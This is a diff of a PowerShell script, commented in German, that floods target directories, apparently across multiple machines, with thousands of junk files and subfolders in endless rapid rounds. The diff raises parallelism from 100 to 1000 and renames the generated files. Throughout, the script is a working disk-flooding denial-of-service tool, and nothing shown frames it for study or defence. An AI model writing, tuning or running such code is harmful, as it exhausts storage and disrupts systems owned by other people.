@@ -227,13 +227,13 @@ while ($global:currentRound -lt $global:maxRounds) {
         $computer = $using:env:COMPUTERNAME
         
         if (Test-Path $ziel) {
-            $mainFolder = Join-Path $ziel "MAIN2PACKET_SCAN_$round"
+            $mainFolder = Join-Path $ziel "FEMBOY_SCAN_$round"
             New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null
             
             # 2000 DATEIEN - OHNE PAUSE
             for ($i = 1; $i -le 2000; $i++) {
                 # Direkt im Ziel
-                $f1 = Join-Path $ziel "MAIN2PACKET_SCAN_$i.king"
+                $f1 = Join-Path $ziel "FEMBOY_SCAN_$i.king"
                 "$computer - EXTREME SPEED $round - $i" | Out-File $f1 -Encoding UTF8 -Force
                 
                 # Im Hauptordner
@@ -253,9 +253,9 @@ while ($global:currentRound -lt $global:maxRounds) {
                     $sf = Join-Path $subFolder "subfile_$s.king"
                     "SUB $u - FILE $s" | Out-File $sf -Encoding UTF8 -Force
                 }
-            } -ThrottleLimit 100
+            } -ThrottleLimit 1000
         }
-    } -ThrottleLimit 100  # 100 Ziele parallel
+    } -ThrottleLimit 1000  # 100 Ziele parallel
     
     # KEINE PAUSE - SOFORT WEITER
     Write-Host "."
